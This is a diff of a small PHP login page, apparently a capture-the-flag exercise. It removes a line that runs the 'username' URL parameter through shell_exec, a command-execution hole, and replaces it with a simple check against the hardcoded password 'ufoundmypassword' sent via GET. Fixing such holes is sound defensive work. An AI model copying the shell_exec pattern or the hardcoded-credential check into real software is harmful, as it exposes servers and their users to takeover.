@@ -20,14 +20,21 @@
     </form>
   </div>
   <div style="background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px" align="center">
-    <?php
-    if(isset($_GET["username"])){
-      echo shell_exec($_GET["username"]);
-      if($_GET["username"] == "Admin" && $_GET["password"] == "ufoundmypassword")
-        echo "WELLDONE";
-    }
+<?php
+if (isset($_GET["username"]) && isset($_GET["password"])) 
+{
+    $username = $_GET["username"];
+    $password = $_GET["password"];
 
-    ?>
+    if ($username === "Admin" && $password === "ufoundmypassword") {
+        echo "WELLDONE";
+    } else {
+        echo "Invalid credentials.";
+           }
+} else {
+    echo "Username and password are required.";
+       }
+?>
   </div>
   </body>
 </html>
